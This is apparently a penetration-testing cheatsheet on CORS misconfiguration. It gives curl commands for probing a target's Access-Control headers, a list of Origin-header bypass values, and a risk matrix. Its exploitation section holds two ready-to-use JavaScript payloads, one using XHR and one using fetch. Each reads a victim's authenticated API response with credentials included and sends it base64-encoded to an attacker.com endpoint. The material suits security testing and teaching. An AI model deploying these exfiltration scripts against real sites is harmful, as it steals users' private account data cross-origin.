# 🌍 CORS Misconfiguration Cheatsheet

```
   ██████╗ ██████╗ ██████╗ ███████╗
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝
  ██║     ██║   ██║██████╔╝███████╗
  ██║     ██║   ██║██╔══██╗╚════██║
  ╚██████╗╚██████╔╝██║  ██║███████║
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
   Cross-Origin Resource Sharing
```

---

## 🎯 What is CORS

**CORS** controls which origins can access resources. Misconfigurations allow attackers to steal sensitive data cross-origin.

---

## 🔍 Testing CORS

### Basic Test
```bash
curl -H "Origin: https://evil.com" -I https://target.com/api/user

# Check response headers:
Access-Control-Allow-Origin: https://evil.com  # Vulnerable!
Access-Control-Allow-Credentials: true         # Extra dangerous!
```

### Test Payloads (Origin header)
```
# Exact match bypass
https://evil.com
https://target.com.evil.com
https://eviltarget.com
https://target.com%60.evil.com

# Null origin
null

# Subdomain
https://sub.target.com

# Protocol downgrade
http://target.com
```

---

## 💉 Exploitation

### Steal Data (with credentials)
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://vulnerable.com/api/user', true);
xhr.withCredentials = true;
xhr.onload = function() {
    // Send data to attacker
    fetch('https://attacker.com/log?data=' + btoa(xhr.responseText));
};
xhr.send();
</script>
```

### Fetch API Version
```html
<script>
fetch('https://vulnerable.com/api/sensitive', {
    credentials: 'include'
})
.then(r => r.text())
.then(d => {
    fetch('https://attacker.com/?data=' + btoa(d));
});
</script>
```

---

## 📊 Vulnerability Matrix

| ACAO Header | ACAC | Risk |
|-------------|------|------|
| `*` | false | Low (no creds) |
| `*` | true | Invalid config |
| Attacker origin | true | **CRITICAL** |
| null | true | **HIGH** |
| Reflected origin | true | **CRITICAL** |

### Dangerous Patterns
```http
# Reflects any origin
Access-Control-Allow-Origin: [request origin]
Access-Control-Allow-Credentials: true

# Allows null
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

---

## 🛠️ Quick Checks

```bash
# Automation with curl
for origin in "https://evil.com" "null" "https://target.com.evil.com"; do
  echo "Testing: $origin"
  curl -sI -H "Origin: $origin" https://target.com/api | grep -i "access-control"
done
```

---

## 📚 Resources

- [PortSwigger CORS](https://portswigger.net/web-security/cors)
- [CORS Exploitation Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)

---

<p align="center">
  <b>🌍 Exploit CORS!</b><br>
  <i>For authorized testing only!</i>
</p>
